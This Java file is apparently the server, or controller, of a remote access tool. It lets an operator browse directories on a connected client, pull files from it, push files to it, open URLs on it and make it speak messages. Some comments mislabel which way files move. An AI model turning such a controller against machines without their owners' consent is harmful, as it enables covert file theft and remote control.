package Server;

import NetworkUtils.NetworkUtil;
import NetworkUtils.PacketHandler;
import NetworkUtils.Packets.*;
import NetworkUtils.SocketConnection;
import Server.Networking.ServerClient;
import Server.Networking.ServerNetworkHandler;
import NetworkUtils.Packet;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.util.List;

public class Server {
    private static ServerNetworkHandler networkHandler;
    private static ServerClient selectedClient;

    public static void run() {
        System.out.println("Running server!");
        networkHandler = new ServerNetworkHandler();

        ServerSocket serverSocket;
        try {
            serverSocket = new ServerSocket(NetworkUtil.port);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }

        Thread connectionChecker = new Thread(() -> {
            while (true) {
                if (!networkHandler.readConnections(serverSocket)) {
                    System.out.println("Failed to connect!");
                    continue;
                }
                System.out.println("Found a connection!");
            }
        });

        connectionChecker.start();

        Thread cliThread = new Thread(() -> startCLI());
        // Start CLI interface for server commands on new thread
        cliThread.start();
        while (true) {
            try {
                loop();
                Thread.sleep(50);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static void setSelectedClient(ServerClient client) {
        System.out.println("Updated selected client");
        selectedClient = client;
    }

    public static void loop() {
        networkHandler.getClients().forEach(client -> {
            List<Packet> packets = client.getConnection().parseReceivedPackets();
            packets.forEach(packet -> {
                System.out.println("Received packet: " + packet.toString());
                client.processPacket(packet);
            });
        });
    }

    // CLI for handling server commands
    public static void startCLI() {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        while (true) {
            try {
                System.out.println("Enter command:");
                String input = reader.readLine().trim();
                if (input.isEmpty()) continue;

                processCommand(input);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    // 🚀 Now used for both CLI and Admin Commands!
    public static void processCommand(String input) {
        String[] parts = input.split(" ", 2);
        String command = parts[0].toLowerCase();
        String arguments = parts.length > 1 ? parts[1] : "";

        switch (command) {
            case "view":
                viewDirectory();
                break;
            case "change":
                changeDirectory(arguments);
                break;
            case "upload":
                handleUpload(arguments);
                break;
            case "download":
                handleDownloadRequest(arguments);
                break;
            case "print":
                handlePrint(arguments);
                break;
            case "website":
                handleWebsite(arguments);
                break;
            case "speak":
                handleSpeak(arguments);
                break;
            default:
                System.out.println("Unknown command! Try again.");
                break;
        }
    }

    private static void viewDirectory() {
        String currentDirectory = System.getProperty("user.dir");
        System.out.println("Current Directory: " + currentDirectory);
        selectedClient.getConnection().sendPacket(new ViewDirectoryPacket(currentDirectory));
    }

    private static void changeDirectory(String newPath) {
        if (newPath.isEmpty()) {
            System.out.println("Usage: change <directory_path>");
            return;
        }
        selectedClient.getConnection().sendPacket(new ChangeDirectoryPacket(newPath));
        System.out.println("Changing directory to: " + newPath);
    }

    // Command: Download (client → server)
    private static void handleDownloadRequest(String arguments) {
        String[] args = arguments.split(" ", 2);
        if (args.length < 2) {
            System.out.println("Usage: download <source_file_on_server> <destination_on_client>");
            return;
        }

        String fileSrc = args[0];
        String fileDst = args[1];
        int fileId = selectedClient.getConnection().getRandomFileID();
        UploadRequestPacket uploadRequest = new UploadRequestPacket(fileId, fileSrc, fileDst);
        selectedClient.getConnection().sendPacket(uploadRequest);

        System.out.println("Server is requesting file: " + fileSrc + " from client.");
    }


    // Command: Download (server → client)
    private static void handleUpload(String arguments) { // Server sends file to client
        String[] args = arguments.split(" ", 2);
        if (args.length < 2) {
            System.out.println("Usage: upload <source_file_on_client> <destination_on_server>");
            return;
        }

        NetworkUtil.uploadFile(new File(args[0]), args[1], selectedClient.getConnection());
        System.out.println("Uploading file " + args[0] + " to client");
    }

    private static void handlePrint(String message) {
        if (message.isEmpty()) {
            System.out.println("Usage: print <message>");
            return;
        }

        selectedClient.getConnection().sendPacket(new PrintPacket(message));
        System.out.println("Message sent to client: " + message);
    }

    private static void handleWebsite(String url) {
        if (url.isEmpty()) {
            System.out.println("Usage: website <url>");
            return;
        }

        selectedClient.getConnection().sendPacket(new WebsitePacket(url));
        System.out.println("Website URL sent to client: " + url);
    }

    private static void handleSpeak(String message) {
        if (message.isEmpty()) {
            System.out.println("Usage: speak <message>");
            return;
        }

        selectedClient.getConnection().sendPacket(new SpeakPacket(message));
        System.out.println("Spoken message sent to client: " + message);
    }
}
